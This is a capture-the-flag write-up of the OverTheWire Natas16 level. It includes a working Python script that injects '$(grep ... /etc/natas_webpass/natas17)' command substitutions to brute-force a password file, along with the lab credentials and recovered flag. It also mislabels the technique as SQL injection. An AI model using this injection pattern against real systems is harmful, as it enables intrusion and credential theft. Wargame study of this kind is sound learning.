# CTF Writeup - **OverTheWire Natas15 - Natas16**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas15 - Natas16
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 16-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use python to find the flag using blind injection.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas16
Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
URL:      http://natas16.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for an input.  But we dont know anything about it, So lets input some random names and check it out. 

```bash
For security reasons, we now filter even more on certain characters
Find words containing: natas
# sonatas
```

Now we see that we get the words that has natas in it in the list. Lets view the source code. 

```bash
# Output:
# <pre>
# <?
# $key = "";

# if(array_key_exists("needle", $_REQUEST)) {
#     $key = $_REQUEST["needle"];
# }

# if($key != "") {
#     if(preg_match('/[;|&`\'"]/',$key)) {
#         print "Input contains an illegal character!";
#     } else {
#         passthru("grep -i \"$key\" dictionary.txt");
#     }
# }
# ?>
# </pre>
```

We can see that there is a small piece of code that is executed when we click on submit. That takes out input and checks if there is any special characters in the input that matches with the restricted characters. if it matches then it errors out. Else, it tries to find out the text that matches out input. Something that is very interesting here is that we can see special characters like `$(/)` is not restricted so we can take advantage of this and exploit it. What we can do is use command substitution. For example `echo $(pwd)` the following command executes `pwd` command and then executes the `echo` command next. This prints the current working directory. Since we know the place where the password is stored we can use `$(grep {char} /etc/natas_webpass/natas17)testing` as input as this will check if the `char` is present in the password file. If the character is present then it will print the password which is appended to `testing`. This resulting string will not be present in the dictionary file. If the character is not present in the file then it ends up searching `testing` alone. This will produce results. This is similar to previours challenge so we can do it using python as shown below.


```bash
import string
import requests
from urllib.parse import quote

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

characters = ''.join([string.ascii_letters, string.digits])

# Step 1: Determine the valid characters in the password
valid_password = ""
for char in characters:
    uri = "{0}?needle=$(grep {1} /etc/natas_webpass/natas17)testing".format(url, char)
    r = requests.get(uri, auth=(auth_username, auth_password))
    if 'testing' not in r.text:
        valid_password += char
        print("Password Dictionary: {}".format(''.join(valid_password)))


password = []
for i in range(0, 32):
    for char in valid_password:
        uri = "{0}?needle=$(grep -E ^{1}{2}.* /etc/natas_webpass/natas17)testing".format(url, ''.join(password), char)
        r = requests.get(uri, auth=(auth_username, auth_password))
        if 'testing' not in r.text:
            password.append(char)
            print( "Passoword so far: "+ ''.join(password))
            break
        else:
            continue

```

What we are doing here is that we are essentially finding all the characters in the password using the bruteforce approach and blind sql injection which checks if the character is present in the passowrd file and returns respone. With this we will have all the characters in the password. Now we need to determine the order of these characters that is done in the second loop where we build the characters one by one untill we find the right order.  

```bash
# Password Dictionary: b
# Password Dictionary: bh
# Password Dictionary: bhj
# Password Dictionary: bhjk
# Password Dictionary: bhjko
# Password Dictionary: bhjkoq
# Password Dictionary: bhjkoqs
# Password Dictionary: bhjkoqsv
# Password Dictionary: bhjkoqsvw
# Password Dictionary: bhjkoqsvwC
# Password Dictionary: bhjkoqsvwCE
# Password Dictionary: bhjkoqsvwCEF
# Password Dictionary: bhjkoqsvwCEFH
# Password Dictionary: bhjkoqsvwCEFHJ
# Password Dictionary: bhjkoqsvwCEFHJL
# Password Dictionary: bhjkoqsvwCEFHJLN
# Password Dictionary: bhjkoqsvwCEFHJLNO
# Password Dictionary: bhjkoqsvwCEFHJLNOT
# Password Dictionary: bhjkoqsvwCEFHJLNOT0
# Password Dictionary: bhjkoqsvwCEFHJLNOT05
# Password Dictionary: bhjkoqsvwCEFHJLNOT057
# Password Dictionary: bhjkoqsvwCEFHJLNOT0578
# Password Dictionary: bhjkoqsvwCEFHJLNOT05789
# Passoword so far: E
# Passoword so far: Eq
# Passoword so far: Eqj
# Passoword so far: EqjH
# Passoword so far: EqjHJ
# Passoword so far: EqjHJb
# Passoword so far: EqjHJbo
# Passoword so far: EqjHJbo7
# Passoword so far: EqjHJbo7L
# Passoword so far: EqjHJbo7LF
# Passoword so far: EqjHJbo7LFN
# Passoword so far: EqjHJbo7LFNb
# Passoword so far: EqjHJbo7LFNb8
# Passoword so far: EqjHJbo7LFNb8v
# Passoword so far: EqjHJbo7LFNb8vw
# Passoword so far: EqjHJbo7LFNb8vwh
# Passoword so far: EqjHJbo7LFNb8vwhH
# Passoword so far: EqjHJbo7LFNb8vwhHb
# Passoword so far: EqjHJbo7LFNb8vwhHb9
# Passoword so far: EqjHJbo7LFNb8vwhHb9s
# Passoword so far: EqjHJbo7LFNb8vwhHb9s7
# Passoword so far: EqjHJbo7LFNb8vwhHb9s75
# Passoword so far: EqjHJbo7LFNb8vwhHb9s75h
# Passoword so far: EqjHJbo7LFNb8vwhHb9s75ho
# Passoword so far: EqjHJbo7LFNb8vwhHb9s75hok
# Passoword so far: EqjHJbo7LFNb8vwhHb9s75hokh
# Passoword so far: EqjHJbo7LFNb8vwhHb9s75hokh5
# Passoword so far: EqjHJbo7LFNb8vwhHb9s75hokh5T
# Passoword so far: EqjHJbo7LFNb8vwhHb9s75hokh5TF
# Passoword so far: EqjHJbo7LFNb8vwhHb9s75hokh5TF0
# Passoword so far: EqjHJbo7LFNb8vwhHb9s75hokh5TF0O
# Passoword so far: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```


## Flag

**Flag:** EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC


---

## Lessons Learned

It was a bit of challenge for me. I was able to grasp the idead behind the solution very easily. I learnt a lot on how to approach these types of challenges.